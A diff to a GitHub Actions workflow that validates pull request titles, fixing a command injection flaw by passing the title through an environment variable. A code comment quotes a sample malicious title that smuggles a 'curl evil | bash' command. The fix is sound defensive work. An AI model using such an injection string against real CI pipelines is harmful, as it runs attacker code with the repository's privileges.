@@ -10,8 +10,12 @@ jobs:
     timeout-minutes: 2
     steps:
       - name: Check conventional commit format
+        # The PR title is attacker-controlled; pass it via env (never expand it
+        # into the shell source) so a title like `"; curl evil | bash #` can't
+        # inject commands into this run block.
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
         run: |
-          TITLE="${{ github.event.pull_request.title }}"
           PATTERN='^(feat|fix|chore|docs|refactor|test|ci|perf|style|build|revert)(\(.+\))?: .+'
           if [[ ! "$TITLE" =~ $PATTERN ]]; then
             echo "::error::PR title must follow conventional commits format."
